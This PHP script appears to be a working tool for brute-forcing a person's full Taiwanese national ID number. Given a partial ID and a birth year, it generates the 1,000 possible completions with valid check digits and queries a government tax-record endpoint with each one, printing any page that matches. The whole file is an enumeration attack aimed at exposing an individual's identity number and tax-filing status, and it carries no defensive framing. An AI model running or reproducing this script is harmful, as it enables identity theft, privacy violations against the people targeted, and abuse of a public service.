<?php

/*
Filename:
	index9.php

Usage:
	use browser and add parameters: "index9.php?id=xxxxx&year=yy"

Descriptions:
	This file is a magic mirror to find out somebody's ID.
*/

include_once("LIB_http.php");

function generate_extend_digit($id_except_last_digit)
{
	$alphabet_to_num_old = array(
		'A' => '10', 'B' => '11', 'C' => '12', 'D' => '13', 'E' => '14', 'F' => '15',
		'G' => '16', 'H' => '17', 'I' => '34', 'J' => '18', 'K' => '19', 'L' => '20',
		'M' => '21', 'N' => '22', 'O' => '35', 'P' => '23', 'Q' => '24', 'R' => '25',
		'S' => '26', 'T' => '27', 'U' => '28', 'V' => '29', 'X' => '30', 'Y' => '31',
		);

	$alphabet_to_num = array(
		'A' => '10', 'B' => '11', 'C' => '12', 'D' => '13', 'E' => '14', 'F' => '15',
		'G' => '16', 'H' => '17', 'I' => '34', 'J' => '18', 'K' => '19', 'L' => '20',
		'M' => '21', 'N' => '22', 'O' => '35', 'P' => '23', 'Q' => '24', 'R' => '25',
		'S' => '26', 'T' => '27', 'U' => '28', 'V' => '29', 'W' => '30', 'X' => '31',
		'Y' => '32', 'Z' => '33',
		);

	$alphabet_to_city = array(
		'A' => '台北市', 'B' => '台中市', 'C' => '基隆市', 'D' => '台南市',
		'E' => '高雄市', 'F' => '台北縣', 'G' => '宜蘭縣', 'H' => '桃園縣',
		'I' => '嘉義市', 'J' => '新竹縣', 'K' => '苗栗縣', 'L' => '台中縣',
		'M' => '南投縣', 'N' => '彰化縣', 'O' => '新竹市', 'P' => '雲林縣',
		'Q' => '嘉義縣', 'R' => '台南縣', 'S' => '高雄縣', 'T' => '屏東縣',
		'U' => '花蓮縣', 'V' => '台東縣', 'W' => '金門縣', 'X' => '澎湖縣',
		'Y' => '陽明山', 'Z' => '連江縣',
		);

	$previous_two_digits = $alphabet_to_num[$id_except_last_digit[0]];
	$digit_1 = $previous_two_digits . substr($id_except_last_digit, 1);

	$checksum =
		$digit_1[0] +
		$digit_1[1] * 9 +
		$digit_1[2] * 8 +
		$digit_1[3] * 7 +
		$digit_1[4] * 6 +
		$digit_1[5] * 5 +
		$digit_1[6] * 4 +
		$digit_1[7] * 3 +
		$digit_1[8] * 2 +
		$digit_1[9];

	$checksum %= 10;
	if ($checksum !=0)
		$checksum =  10 - $checksum;

	return $id_except_last_digit . (string)$checksum;
}

date_default_timezone_set ("Asia/Taipei");
header('Content-Type: text/html; charset=utf-8');

if (isset($_SERVER['HTTP_USER_AGENT'])) echo "<pre>";
$t1 = round(microtime(true) * 1000);
echo "Start time: " . date("Y-m-d") . " " . date("h:i:sa") . "\n\n";

$known_id = $_GET["id"];
$tw_year = $_GET["year"];

// Only 1000 iterations per year suffices, since last digit is computed checksum
for($ii=0;$ii<1000;$ii++)
{
	$id_except_last_digit = $known_id . sprintf("%03d", (string)$ii);
	$full_id = generate_extend_digit($id_except_last_digit);
	$target = "https://svc.tax.nat.gov.tw/svc/servletirxwresult?qtype=forpc&DO=goQuery&idn=" .
		$full_id . "&birth=" . $tw_year;
	echo $target . "\n";

	$response = http_get($target, "");
	if (strstr($response['FILE'], "查無申報成功紀錄，請確認您所輸入之身分證統一編號及出生年資料正確。"))
	{
		echo $full_id . "@" . $tw_year . "-> failed\n";
	}
	else
	{
		echo $full_id . "@" . $tw_year . "-> ok!\n";
		echo $response['FILE'];
		//break;
	}
}

if (isset($_SERVER['HTTP_USER_AGENT'])) echo "<pre>";
$t2 = round(microtime(true) * 1000);
echo "End time: " . date("Y-m-d") . " " . date("h:i:sa") . "\n";
echo "Duration: " . ($t2 - $t1) . "ms" . "\n";
if (isset($_SERVER['HTTP_USER_AGENT'])) echo "</pre>";

?>